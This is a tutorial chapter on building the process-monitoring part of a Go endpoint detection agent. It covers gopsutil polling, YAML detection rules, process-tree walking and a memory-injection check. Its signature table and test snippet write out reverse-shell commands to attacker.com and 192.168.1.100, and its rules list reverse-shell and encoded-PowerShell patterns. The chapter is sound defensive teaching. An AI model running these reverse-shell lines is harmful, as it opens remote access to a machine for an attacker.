# Chapter 61: GoShield Agent — Process Monitoring

*Process monitoring is the heart of EDR. Every attack involves processes. This chapter builds the process monitor that tracks what's running, how it was spawned, and what it's doing.*

---

## What Process Events Reveal

Every attack involves process activity:

| Attack | Process signature |
|--------|------------------|
| Command & Control | `powershell.exe` spawned by `winword.exe` |
| Reverse shell | `bash -i >& /dev/tcp/attacker.com/4444` |
| Privilege escalation | `sudo` child process of unexpected parent |
| Ransomware | Mass file open + encrypt from single process |
| Lateral movement | `psexec.exe` or `ssh` with unusual args |
| Credential dumping | `lsass.exe` memory access |
| Encoded payload | `powershell.exe -EncodedCommand ...` |

**The key relationship:** parent-child process trees. `word.exe → cmd.exe → powershell.exe` is suspicious (Office app spawning a shell). `nginx → bash` is suspicious (web server spawning a shell = webshell executed).

---

## Using `gopsutil` for Process Information

The `gopsutil` library provides cross-platform process, system, and network information:

```bash
go get github.com/shirou/gopsutil/v3
```

```go
package main

import (
    "fmt"
    "github.com/shirou/gopsutil/v3/process"
)

func main() {
    // Get all running processes
    procs, _ := process.Processes()
    
    for _, p := range procs {
        name, _ := p.Name()
        cmdline, _ := p.Cmdline()
        ppid, _ := p.Ppid()
        username, _ := p.Username()
        
        fmt.Printf("PID: %d | PPID: %d | User: %s | Name: %s\n",
            p.Pid, ppid, username, name)
        if cmdline != "" {
            fmt.Printf("  CMD: %s\n", cmdline)
        }
    }
}
```

---

## Building the Process Monitor

The challenge: Linux doesn't have native process creation events (unlike Windows with ETW). We poll periodically and diff against previous state.

For production Linux EDR, you'd use:
- `ebpf` programs to hook `execve` syscall (what CrowdStrike does)
- `netlink` process connectors
- `audit` subsystem

For our Go implementation, we'll use a hybrid: polling + `/proc` filesystem monitoring:

```go
// pkg/agent/procwatcher.go
package agent

import (
    "crypto/sha256"
    "encoding/hex"
    "fmt"
    "io"
    "os"
    "path/filepath"
    "sync"
    "time"
    
    "github.com/shirou/gopsutil/v3/process"
    "github.com/yourname/goshield/pkg/events"
)

// ProcessWatcher monitors process creation and termination
type ProcessWatcher struct {
    agentID  string
    hostname string
    eventCh  chan<- interface{}
    stopCh   chan struct{}
    wg       sync.WaitGroup
    
    // Track known processes
    known   map[int32]*ProcessInfo
    knownMu sync.RWMutex
    
    pollInterval time.Duration
}

// ProcessInfo caches info about a running process
type ProcessInfo struct {
    PID         int32
    PPID        int32
    Name        string
    Cmdline     string
    Username    string
    ExePath     string
    SHA256      string
    FirstSeen   time.Time
    IsElevated  bool
}

// NewProcessWatcher creates a process watcher
func NewProcessWatcher(agentID, hostname string, eventCh chan<- interface{}) *ProcessWatcher {
    pw := &ProcessWatcher{
        agentID:      agentID,
        hostname:     hostname,
        eventCh:      eventCh,
        stopCh:       make(chan struct{}),
        known:        make(map[int32]*ProcessInfo),
        pollInterval: 2 * time.Second, // Poll every 2 seconds
    }
    
    // Snapshot existing processes (don't generate events for pre-existing)
    pw.snapshotExisting()
    
    return pw
}

// snapshotExisting populates initial process state without generating events
func (pw *ProcessWatcher) snapshotExisting() {
    procs, err := process.Processes()
    if err != nil {
        return
    }
    
    pw.knownMu.Lock()
    defer pw.knownMu.Unlock()
    
    for _, p := range procs {
        info := pw.collectProcessInfo(p)
        if info != nil {
            pw.known[p.Pid] = info
        }
    }
}

// collectProcessInfo gathers detailed info about a process
func (pw *ProcessWatcher) collectProcessInfo(p *process.Process) *ProcessInfo {
    name, err := p.Name()
    if err != nil {
        return nil
    }
    
    ppid, _ := p.Ppid()
    cmdline, _ := p.Cmdline()
    username, _ := p.Username()
    exepath, _ := p.Exe()
    
    // Check if running as root/elevated
    uids, _ := p.Uids()
    isElevated := len(uids) > 0 && uids[0] == 0
    
    // Hash the executable (cache this — expensive)
    sha256Hash := ""
    if exepath != "" {
        sha256Hash, _ = hashFileFast(exepath)
    }
    
    return &ProcessInfo{
        PID:        p.Pid,
        PPID:       int32(ppid),
        Name:       name,
        Cmdline:    cmdline,
        Username:   username,
        ExePath:    exepath,
        SHA256:     sha256Hash,
        FirstSeen:  time.Now(),
        IsElevated: isElevated,
    }
}

// Start begins process monitoring
func (pw *ProcessWatcher) Start() {
    pw.wg.Add(1)
    go pw.monitor()
}

// Stop gracefully stops the watcher
func (pw *ProcessWatcher) Stop() {
    close(pw.stopCh)
    pw.wg.Wait()
}

// monitor is the main monitoring loop
func (pw *ProcessWatcher) monitor() {
    defer pw.wg.Done()
    ticker := time.NewTicker(pw.pollInterval)
    defer ticker.Stop()
    
    for {
        select {
        case <-pw.stopCh:
            return
        case <-ticker.C:
            pw.poll()
        }
    }
}

// poll checks current processes against known state
func (pw *ProcessWatcher) poll() {
    currentProcs, err := process.Processes()
    if err != nil {
        return
    }
    
    // Build current PID set
    currentPIDs := make(map[int32]*process.Process)
    for _, p := range currentProcs {
        currentPIDs[p.Pid] = p
    }
    
    pw.knownMu.Lock()
    defer pw.knownMu.Unlock()
    
    // Find new processes (in current but not known)
    for pid, p := range currentPIDs {
        if _, known := pw.known[pid]; !known {
            info := pw.collectProcessInfo(p)
            if info == nil {
                continue
            }
            pw.known[pid] = info
            pw.emitProcessEvent(info, "create")
        }
    }
    
    // Find terminated processes (in known but not current)
    for pid, info := range pw.known {
        if _, current := currentPIDs[pid]; !current {
            pw.emitProcessEvent(info, "terminate")
            delete(pw.known, pid)
        }
    }
}

// emitProcessEvent sends a process event downstream
func (pw *ProcessWatcher) emitProcessEvent(info *ProcessInfo, action string) {
    event := &events.ProcessEvent{
        Base: events.Base{
            ID:        events.NewID(),
            AgentID:   pw.agentID,
            Hostname:  pw.hostname,
            Timestamp: time.Now(),
            Type:      events.EventTypeProcess,
        },
        Action:      action,
        PID:         int(info.PID),
        PPID:        int(info.PPID),
        Name:        info.Name,
        CommandLine: info.Cmdline,
        Username:    info.Username,
        ExePath:     info.ExePath,
        SHA256:      info.SHA256,
        IsElevated:  info.IsElevated,
    }
    
    select {
    case pw.eventCh <- event:
    default:
        // Dropped — channel full
    }
}

// hashFileFast hashes a file but skips if > 50MB (performance)
func hashFileFast(path string) (string, error) {
    info, err := os.Stat(path)
    if err != nil || info.Size() > 50*1024*1024 {
        return "", fmt.Errorf("skipping large/missing file")
    }
    
    f, err := os.Open(path)
    if err != nil {
        return "", err
    }
    defer f.Close()
    
    h := sha256.New()
    if _, err := io.Copy(h, f); err != nil {
        return "", err
    }
    
    return hex.EncodeToString(h.Sum(nil)), nil
}
```

---

## Process Detection Rules

```yaml
# rules/process/suspicious_parent.yaml
name: Office Application Spawns Shell
id: PROC-001
severity: critical
description: |
  Document application (Word, Excel, Adobe Reader) spawned
  a shell process. Indicates macro or exploit execution.
mitre: "T1566 - Phishing"
condition:
  event_type: process
  all_of:
    - field: action
      equals: "create"
    - field: parent_name   # Note: we need to enrich with parent name
      contains_any: ["winword.exe", "excel.exe", "powerpnt.exe", "acrord32.exe",
                     "outlook.exe", "msword", "libreoffice"]
      case_insensitive: true
    - field: name
      contains_any: ["cmd.exe", "powershell.exe", "bash", "sh", "python", "wscript.exe",
                     "cscript.exe", "mshta.exe", "regsvr32.exe"]
      case_insensitive: true
```

```yaml
# rules/process/encoded_powershell.yaml
name: PowerShell Encoded Command
id: PROC-002
severity: high
description: PowerShell running base64-encoded command — common obfuscation technique
mitre: "T1059.001 - PowerShell"
condition:
  event_type: process
  all_of:
    - field: action
      equals: "create"
    - field: name
      contains: "powershell"
      case_insensitive: true
    - field: command_line
      contains_any: ["-EncodedCommand", "-enc ", "-ec ", "-E "]
      case_insensitive: true
```

```yaml
# rules/process/reverse_shell.yaml
name: Reverse Shell Pattern
id: PROC-003
severity: critical
description: |
  Process command line contains classic reverse shell patterns.
  Attacker connects back to C2 server.
mitre: "T1059 - Command and Scripting Interpreter"
condition:
  event_type: process
  all_of:
    - field: action
      equals: "create"
  any_of:
    - field: command_line
      contains: "/dev/tcp/"
    - field: command_line
      contains: "bash -i"
    - field: command_line
      contains: "nc -e"
    - field: command_line
      contains_all: ["nc", "-l", "-p"]
    - field: command_line
      regex: "\\d+\\.\\d+\\.\\d+\\.\\d+.*\\d{4,5}"  # IP:PORT pattern
```

```yaml
# rules/process/high_freq_new_processes.yaml
name: Process Creation Flood
id: PROC-004
severity: medium
description: |
  Unusual number of new processes created rapidly.
  May indicate worm activity or aggressive scanning tool.
condition:
  event_type: process
  threshold:
    count: 20
    window: 10s
    action: "create"
```

---

## Process Tree Analysis

Building the parent-child process tree reveals attack chains:

```go
// GetProcessTree returns the full ancestry chain for a PID
func GetProcessTree(pid int32) []ProcessInfo {
    var chain []ProcessInfo
    
    current := pid
    for depth := 0; depth < 10; depth++ { // Max 10 levels
        p, err := process.NewProcess(current)
        if err != nil {
            break
        }
        
        name, _ := p.Name()
        cmdline, _ := p.Cmdline()
        ppid, _ := p.Ppid()
        username, _ := p.Username()
        
        chain = append(chain, ProcessInfo{
            PID:     current,
            PPID:    int32(ppid),
            Name:    name,
            Cmdline: cmdline,
            Username: username,
        })
        
        if int32(ppid) == current || ppid == 0 || ppid == 1 {
            break
        }
        current = int32(ppid)
    }
    
    // Reverse so root is first
    for i, j := 0, len(chain)-1; i < j; i, j = i+1, j-1 {
        chain[i], chain[j] = chain[j], chain[i]
    }
    
    return chain
}
```

Example output for a suspicious chain:
```
systemd → sshd → bash → python3 -c 'import os; os.system("whoami")'
```

This immediately reveals: someone SSH'd in and ran Python to execute shell commands.

---

## On Linux: Using `/proc` for More Detail

The Linux `/proc` filesystem provides rich per-process information:

```go
// ReadProcMaps reads process memory maps — useful for detecting injection
func ReadProcMaps(pid int32) ([]string, error) {
    path := fmt.Sprintf("/proc/%d/maps", pid)
    data, err := os.ReadFile(path)
    if err != nil {
        return nil, err
    }
    return strings.Split(string(data), "\n"), nil
}

// CheckForInjection looks for anonymous executable memory regions
// (hallmark of process injection / shellcode)
func CheckForInjection(pid int32) bool {
    maps, err := ReadProcMaps(pid)
    if err != nil {
        return false
    }
    
    for _, line := range maps {
        // An anonymous region (no file) with execute permission is suspicious
        // Format: address perms offset dev inode pathname
        // "r-xp" with no pathname = anonymous executable memory
        fields := strings.Fields(line)
        if len(fields) >= 5 {
            perms := fields[1]
            pathname := ""
            if len(fields) >= 6 {
                pathname = fields[5]
            }
            // rwxp with no backing file = very suspicious
            if strings.Contains(perms, "x") && pathname == "" {
                return true
            }
        }
    }
    return false
}
```

---

## Testing

```bash
# Create a test that triggers detection rules
echo "Testing reverse shell detection..."

# This command line contains a reverse shell pattern
go run - <<'EOF'
package main

import (
    "fmt"
    "os/exec"
)

func main() {
    // Simulate what a reverse shell detection would catch
    // (We're just printing what the command would look like)
    suspiciousCmd := "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
    fmt.Println("Simulated malicious command:", suspiciousCmd)
    
    // In real attack: exec.Command("bash", "-c", suspiciousCmd).Run()
    // We DON'T actually run it — just showing what to detect
    _ = exec.Command
}
EOF
```

---

## Summary

| Capability | Implementation |
|------------|---------------|
| Process enumeration | `gopsutil/process.Processes()` |
| Process details | `Name()`, `Cmdline()`, `Ppid()`, `Username()`, `Exe()` |
| New/terminated detection | Periodic diff against known state |
| Executable hash | `sha256.New()` on the exe file |
| Process tree | Recursive PPID chain walk |
| Injection detection | `/proc/PID/maps` analysis |

---

## Exercises

1. Run the process watcher and start a suspicious process (e.g., `bash -c "echo hello"` from Python). See if it's detected.
2. Add a feature: when a new process is detected, also record its open file handles (`/proc/PID/fd`)
3. Implement process tree enrichment: when emitting an event, attach the full parent chain
4. Write a rule: detect when `cron` spawns a new shell with an unusual command
5. Research eBPF — how would you use it instead of polling? What are the advantages?
